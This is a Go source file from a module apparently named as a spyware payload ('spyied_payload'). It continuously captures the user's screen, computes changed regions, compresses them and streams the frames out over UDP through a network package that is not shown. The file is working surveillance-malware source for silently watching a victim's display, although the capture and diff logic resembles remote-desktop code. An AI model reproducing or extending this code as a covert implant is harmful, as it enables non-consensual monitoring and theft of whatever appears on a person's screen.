package screen

import (
	"bytes"
	"fmt"
	"image"
	"spyied_payload/network"
	"time"

	"github.com/kbinani/screenshot"
)

const MAX_PACKET_SIZE = 65507

func InitCapturer(config *Config) *Capturer {
	bounds := screenshot.GetDisplayBounds(config.DisplayIndex)
	bufferSize := bounds.Dx() * bounds.Dy() * 4

	return &Capturer{
		config:    config,
		prevFrame: make([]byte, bufferSize),
		bounds:    bounds,
	}
}

func (c *Capturer) CaptureLoop() {
	c.stopChan = make(chan struct{})
	frameInterval := time.Second / time.Duration(c.config.TargetFPS)

	for {
		select {
		case <-c.stopChan:
			fmt.Println("Stopping capture loop...")
			return
		default:
		}

		start := time.Now()

		frame, err := c.Captureframe()
		if err != nil {
			fmt.Printf("frame capture failed: %v\n", err)
			continue
		}

		if frame.dirtyRect.width == 0 || frame.dirtyRect.height == 0 {
			time.Sleep(frameInterval)
			continue
		}

		if c.config.NetworkEnabled {
			c.sendframe(frame)
		}

		// Maintain frame rate
		elapsed := time.Since(start)
		if elapsed < frameInterval {
			time.Sleep(frameInterval - elapsed)
		}
	}
}

func (c *Capturer) Stop() {
	close(c.stopChan)
}

func (c *Capturer) Captureframe() (*frame, error) {
	img, err := screenshot.CaptureRect(c.bounds)
	if err != nil {
		return nil, err
	}

	frame := &frame{
		sequenceNumber: c.seqNum,
		bounds:         c.bounds,
	}

	// RGBA format to send over network
	rgba := image.NewRGBA(c.bounds)
	for y := c.bounds.Min.Y; y < c.bounds.Max.Y; y++ {
		for x := c.bounds.Min.X; x < c.bounds.Max.X; x++ {
			rgba.Set(x, y, img.At(x, y))
		}
	}

	frame.data = rgba.Pix
	frame.dirtyRect = c.findDirtyRect(frame.data)

	if frame.dirtyRect.width > 0 && frame.dirtyRect.height > 0 {
		dirtyData := c.extractDirtyRegion(frame.data, frame.dirtyRect)
		frame.compressedData = compressData(dirtyData)
	}

	copy(c.prevFrame, frame.data)
	c.seqNum++

	return frame, nil
}

func (c *Capturer) findDirtyRect(current []byte) dirtyRect {
	width, height := c.bounds.Dx(), c.bounds.Dy()
	var minX, minY = width, height
	var maxX, maxY = 0, 0

	for y := 0; y < height; y += c.config.BlockSize {
		for x := 0; x < width; x += c.config.BlockSize {
			hasChanges := false
			blockH := min(c.config.BlockSize, height-y)
			blockW := min(c.config.BlockSize, width-x)

			for by := 0; by < blockH; by++ {
				for bx := 0; bx < blockW; bx++ {
					idx := ((y+by)*width + (x + bx)) * 4
					if !bytes.Equal(current[idx:idx+4], c.prevFrame[idx:idx+4]) {
						hasChanges = true
						break
					}
				}
				if hasChanges {
					break
				}
			}

			if hasChanges {
				minX = min(minX, x)
				maxX = max(maxX, x+blockW)
				minY = min(minY, y)
				maxY = max(maxY, y+blockH)
			}
		}
	}

	if maxX < minX {
		return dirtyRect{}
	}

	return dirtyRect{
		x:      int32(minX),
		y:      int32(minY),
		width:  int32(maxX - minX),
		height: int32(maxY - minY),
	}
}

func (c *Capturer) extractDirtyRegion(frame []byte, dirty dirtyRect) []byte {
	region := make([]byte, dirty.width*dirty.height*4)
	stride := c.bounds.Dx()

	for y := 0; y < int(dirty.height); y++ {
		srcIdx := ((int(dirty.y)+y)*stride + int(dirty.x)) * 4
		dstIdx := y * int(dirty.width) * 4
		copy(region[dstIdx:dstIdx+int(dirty.width)*4], frame[srcIdx:srcIdx+int(dirty.width)*4])
	}
	return region
}

func (c *Capturer) sendframe(frame *frame) error {
	packets := splitIntoPackets(frame)
	fmt.Printf("Sending compressed packets with length %d\n", len(frame.compressedData))

	for _, packet := range packets {
		i, err := network.SendUDPPacket(packet)

		if err != nil {
			fmt.Printf("Failed to send packet %d: %v\n", i, err)
			return err
		}

		fmt.Printf("Sent packet with length %d\n", i)
	}

	return nil
}
